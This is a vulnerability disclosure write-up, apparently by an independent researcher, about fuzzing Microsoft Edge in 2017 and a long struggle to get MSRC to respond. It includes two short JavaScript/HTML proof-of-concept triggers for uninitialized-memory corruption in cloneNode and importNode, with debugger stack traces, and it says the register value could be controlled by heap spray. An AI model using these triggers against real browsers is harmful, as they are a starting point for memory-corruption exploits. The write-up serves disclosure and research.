# Msrc Case: 41548 CRM:0001020892 Microsoft Edge multiple race conditions leading to rce.

So it all started with ivan fratric project zero <html><a href="https://googleprojectzero.blogspot.co.il/2017/09/the-great-dom-fuzz-off-of-2017.html">blog post and the new open source fuzzer-DOMATO.</a></html>. i have read the post and decided to try and experiment a little with fuzzing this browser.<br> it didnt take long for me to realize that menuel fuzzing will be too much of a pain and i began to write my own harness, in addition i made some changes and added extra api's to the fuzzer in order to get a little heads-up on the big amount of people who are currently running the fuzzer (i only had one machine).<br>
anyone who had ever fuzzed edge knows that there are a big amount of un-exploitable bugs in edge that can make the fuzzing work very difficult, one has to capture the debug output but to filter out those, it seems as if microsoft has no intention to fix any of those bugs. (a list will be given at the end of this article of about 500 dos conditions that go from division by zero to mem-gc protected uaf's).<br>
but, maybe to reader suprise, the difficult part was not coding the harness and overcoming the recent changes to edge ( Edge has become a full Universal Windows Platform (UWP) App. This means that the main Edge process no longer spawns any of the sandboxed child processes directly, but that all processes are spawned by the UWP framework.) that makes fuzzing this program to a somewhat challenging task, the most difficult part of this bug hunting quest was contacting msrc. i will try to add as little description as i possibly can to not sound like i got any opinion on the issue (although it will be a little difficult).

it was not long before i came across some intersting crash's, but none of them seemed to have any security context, and all this time i was thinking that maybe ivan released this too fast. another one of my thoughts was, maybe he simply gave up contacting msrc, seeing posts like this <html> <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1237&can=1&q=&start=1000">one</a></html>.

well, i was about to give up, and have stoped my harness. this was the first day stable rs3 was out and i have upgraded my computer. it was also the time of this <html> <a href="https://twitter.com/dwizzzleMSFT/status/920637599449939968">public relations post</a></html> was out. and i decided to give one last longshot to the fuzzer. after running the automation during the night i have noticed one weird crash it looked as if edgehtml was trying to get a length of a url-string from a bogus address way too high to have any meaning. it didnt look exploitable at first but i thought i'd submit this anyway to msrc. like many of my previous submissions to that point i have received a ticket, but till' this day i didnt got any responce. i gave a closer look at the crash and began to see other forms of crash from this sample, some of them looked exploitable at first sight (crashing at memcpy read, or write VA). stupid as i was (the reader will understand later) i have quickly notified msrc about this and i was a little stressed out becouse jugding from my privies expiriance i had very little chance that someone will actually read my emails or take action upon this vulnerability, but on the other hand with a good harness anyone running this fuzzer will probably have better chance than me finding this vulnerability (i only had one machine). including bad people. as always i got a ticket. i continued to research this case and after reducing this test case i was left with this lines:

```javascript
var a1 = document.createElementNS("http://www.w3.org/2000/svg", "mpath");                   (1)                        
a1.style.setProperty("content", "var(--c)");                                                (2)                        
var a2 = a1.cloneNode();                                                                    (3)
```

1 -> has to be an mpath element any other will not crash the content provider.<br>
2 -> can be any variable, but if not set then the content provider will not crash.<br>
3 -> leads to use of uninitialized heap memory.<br><br>

minimal stack trace:<br>

```c
partial stack trace:

 # Child-SP          RetAddr           Call Site
00 00000050`e6bf6208 00007fff`7bccb940 msvcrt!memcpy+0x2e6
01 00000050`e6bf6210 00007fff`51b5a895 msvcrt!memcpy_s+0x60
02 00000050`e6bf6250 00007fff`51f5ea51 edgehtml!CStr::Set+0xa5
03 00000050`e6bf6290 00007fff`51ebac70 edgehtml!CGeneratedContentExpression::Copy+0x35
04 00000050`e6bf62d0 00007fff`51ca2b59 edgehtml!Tree::SpecifiedStyle::CopyPropertiesFrom+0x2180fc
05 00000050`e6bf6340 00007fff`51aa0c3e edgehtml!Tree::SpecifiedStyle::Clone+0x49
06 00000050`e6bf6370 00007fff`51be1872 edgehtml!CAttrValue::InitVariant+0x19e
07 00000050`e6bf63b0 00007fff`51be16d1 edgehtml!CAttrValue::Copy+0x66
08 00000050`e6bf6400 00007fff`51be1562 edgehtml!CAttrArray::Clone+0xf1
09 00000050`e6bf6480 00007fff`517df15e edgehtml!CElement::CloneAttributes+0x42
0a 00000050`e6bf64b0 00007fff`51c81ffe edgehtml!CSVGElement::CloneAttributes+0x1e
0b 00000050`e6bf6530 00007fff`51c62160 edgehtml!CElement::Clone+0x1de
0c 00000050`e6bf66f0 00007fff`51a87787 edgehtml!Tree::TreeWriter::CloneNode+0x80
0d 00000050`e6bf6730 00007fff`519cd476 edgehtml!CElement::CloneNodeHelper+0xa7
0e 00000050`e6bf6760 00007fff`519cd3ed edgehtml!CDOMNode::Var_cloneNode+0x5a
0f 00000050`e6bf6790 00007fff`51d11b45 edgehtml!CFastDOM::CNode::Trampoline_cloneNode+0x91
10 00000050`e6bf67f0 00007fff`511ee581 edgehtml!CFastDOM::CNode::Profiler_cloneNode+0x25
11 00000050`e6bf6820 00007fff`51226df6 chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
12 00000050`e6bf68f0 00007fff`510f942c chakra!amd64_CallFunction+0x86
13 00000050`e6bf6940 00007fff`510fc368 chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
14 00000050`e6bf69a0 00007fff`51102c99 chakra!Js::InterpreterStackFrame::OP_CallI<Js::OpLayoutDynamicProfile<Js::OpLayoutT_CallI<Js::LayoutSizePolicy<1> > > >+0xe8
15 00000050`e6bf69f0 00007fff`5110107c chakra!Js::InterpreterStackFrame::ProcessUnprofiledMediumLayoutPrefix+0x159
16 00000050`e6bf6a50 00007fff`51100f08 chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x8c
```

the crash was as follows:<br><br>

![](pics/curroption,,.PNG)

<br><br>
where the address of rax was taken from rcx who was pointing to heap memory. i have noticed that this is indeed the microsoftedgecp heap memory becouse i could sometimes spot left-overs of the page that redirected to that page. seeking to find exploitability assessment, i tried to see if this data is controllable, after some hours of debugging the application i could controll the register value (by heap spray) who is later used to determine the length of a string to be allocated by the runtime. for whoever is looking to see how one can exploit that oob r/w for rce you can look at this great <html><a href="https://googleprojectzero.blogspot.co.il/2014/07/pwn4fun-spring-2014-safari-part-i_24.html">blogpost</a></html> from Ian beer.<br><br>

from my note's to msrc:<br>
i think that the problem is that while the document still do not contain the new allocated object,<br>
we can still cast properties. that means that there is likly a problem with the constructor,<br>
who do not zero out non-existing fields, calling a clone on this object will lead to use of uninitialized variables.<br>

i have also found different code paths to the same issue that i have identified as a race condition leading to use-of-uninitialized memory (maybe this sample will help):<br>

```javascript
<script>
function go() {

// select the canvas object.
var a = canvas;

// point the element to the document itself (that is not yet contained at the page at the given time).
// so its actually free.

var uafObject = a.parentNode;

// create a new object from the freed object.
// that still points to the process heap (to the unloaded document).

var heapOverFlow = document.importNode(uafObject,true);

}
</script>
</head>
<body onload=go()>

<title id="junk" style="-webkit-clip-path: url(data:image/gif;base64,R0lGODlhEAAQAMQAAORHHOVSKudfOulrSOp3WOyDZu6QdvCchPGolfO0o/XBs/fNwfjZ0frl3/zy7////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAkAABAALAAAAAAQABAAAAVVICSOZGlCQAosJ6mu7fiyZeKqNKToQGDsM8hBADgUXoGAiqhSvp5QAnQKGIgUhwFUYLCVDFCrKUE1lBavAViFIDlTImbKC5Gm2hB0SlBCBMQiB0UjIQA7); content: var(--cssvard); grid-gap: none; border-left-color: ; orientation: auto" class="class7" loop="1" crossorigin="crossorigin" formmethod="post" cols="0" controls="controls">?Nz(CRd</title>

<canvas id="canvas" name="[g1Wvvph^&amp;1S7I" hidden="hidden" dir="ltr" name="" width="0" low="1" placeholder="B|rS8a5x](" onhashchange="eventhandler3()" ontransitionend="eventhandler4()" frame="BOX">

<font id="uafObject" title="YD*2.(ccDWcq" size="4" tabindex="4" dir="auto" title="W" usemap="#htmlvar00009" disposition="attachment" pluginspage="rzAt0o`,]w : #C@f?" preload="none" accept="image/*">7:v=Lgi=5:IM(s&amp;6:r</font>

</canvas>
</body>
```

```c
 # Child-SP          RetAddr           Call Site
00 0000001f`cbcfacb8 00007ffe`cec0b940 msvcrt!memcpy+0x2fa
01 0000001f`cbcfacc0 00007ffe`a56ce525 msvcrt!memcpy_s+0x60
02 0000001f`cbcfad00 00007ffe`a5b3e8b1 edgehtml!CStr::Set+0xa5
03 0000001f`cbcfad40 00007ffe`a5a9ac92 edgehtml!CGeneratedContentExpression::Copy+0x35
04 0000001f`cbcfad80 00007ffe`a5881d59 edgehtml!Tree::SpecifiedStyle::CopyPropertiesFrom+0x218f1e
05 0000001f`cbcfadf0 00007ffe`a567faae edgehtml!Tree::SpecifiedStyle::Clone+0x49
06 0000001f`cbcfae20 00007ffe`a57c01a2 edgehtml!CAttrValue::InitVariant+0x19e
07 0000001f`cbcfae60 00007ffe`a57c0001 edgehtml!CAttrValue::Copy+0x66
08 0000001f`cbcfaeb0 00007ffe`a57bfe92 edgehtml!CAttrArray::Clone+0xf1
09 0000001f`cbcfaf30 00007ffe`a5bc0bda edgehtml!CElement::CloneAttributes+0x42                            <-- CElement this time ..
0a 0000001f`cbcfaf60 00007ffe`a58610be edgehtml!CCommentElement::CloneAttributes+0x1a
0b 0000001f`cbcfaf90 00007ffe`a5840a00 edgehtml!CElement::Clone+0x1de
0c 0000001f`cbcfb150 00007ffe`a58408d8 edgehtml!Tree::TreeWriter::CloneNode+0x80
0d 0000001f`cbcfb190 00007ffe`a5667a5c edgehtml!Tree::TreeWriter::CloneNodeInternal+0xa4
0e 0000001f`cbcfb1e0 00007ffe`a5667be5 edgehtml!Tree::TreeWriter::CloneTreeInternal+0x134
0f 0000001f`cbcfb220 00007ffe`a5666518 edgehtml!Tree::TreeWriter::CloneTree+0x8d
10 0000001f`cbcfb2a0 00007ffe`a5bcf929 edgehtml!CElement::CloneNodeHelper+0x58
11 0000001f`cbcfb2d0 00007ffe`a5ca90d8 edgehtml!CDocument::importNode+0x89                                   <-- Our importNode.
12 0000001f`cbcfb320 00007ffe`a58f8df5 edgehtml!CFastDOM::CDocument::Trampoline_importNode+0xcc              (it's not a common api ..)
13 0000001f`cbcfb3e0 00007ffe`ba7ab491 edgehtml!CFastDOM::CDocument::Profiler_importNode+0x25
```

here are some graphics for the reader:<br><br>

![](pics/register.PNG)<br><br>


![](pics/aaa6.PNG)

at this point i was really stressed out becouse i have in hand an exploitable memory curroption but i cannot update my details on any of my cases in addition i cant get a singal responce to any of my reported emails, i have tried desperately to resend the report and got some emails clarifying me what counts as a vulnerability and other none-sense, here are some of them:

![](pics/a1.PNG)
![](pics/a2.PNG)
![](pics/a3.PNG)
![](pics/a4.PNG)
![](pics/a5.PNG)
![](pics/a6.PNG)
![](pics/a7.PNG)
![](pics/a8.PNG)
![](pics/a9.PNG)
![](pics/a10.PNG)
![](pics/a11.PNG)
![](pics/aboutsecurity.PNG)

by my desperation and my worries to the end users i have submitted the vulnerability to a big third side bounty program hoping that my report will be read. (we will go about that very soon).<br>

at this point i have seen on twitter this thread:
<html><a href="https://twitter.com/berendjanwever/status/929328331899666434">https://twitter.com/berendjanwever/status/929328331899666434</a></html><br>

![](pics/r.PNG)
![](pics/msr.PNG)

so i decided to contact he'm:<br><br>

![](pics/k1.PNG)
![](pics/k2.PNG)
![](pics/k3.PNG)
![](pics/k4.PNG)
![](pics/k5.PNG)
![](pics/k6.PNG)

and then finally after all the mess i got a mail replay thx krzywix (i guess).

![](pics/rsp1.PNG)

at this time i also got the responce from the third party bounty program who offered a decent bounty ofc i had to decline it becouse it was already reported to the vendor, but just for the referance its about the same time in regards to the responce time and the handling of the case (users wise)..

funny thing is i got also this responce (clarifying that this indeed a security issue and will be addressed by microsoft.):

![](pics/ns1.PNG)
![](pics/sn2.PNG)

# Summery
to sum up i woke up to latest patch tuesday with both my bugs fixed. i have lost my bounty that could have helped me a lot in life. i have lost my sanity handling the case directly with msrc. i have lost my acknowledgment for my hard work and efforts.

# TimeLine:

  * 17-10-2017 - vulnerability found
  * 17-10-2017 - vulnerability reported to vendor got initial triage (18).
  * 18-10-2017 - 15-11-2017 - desperately tried to send additional details to msrc.
  * 26-10-2017 - submitted to a third side party bounty program.
  * 15-11-2017 - finally i was responded with acknowledgment of exploitability and a fix pursue by msrc (after contacting @krzywix).
  * 21-11-2017 - recived a decent bounty offer - that i had to decline.
  * 12-12-2017 - vulnerability fixed, without credit or bounty.


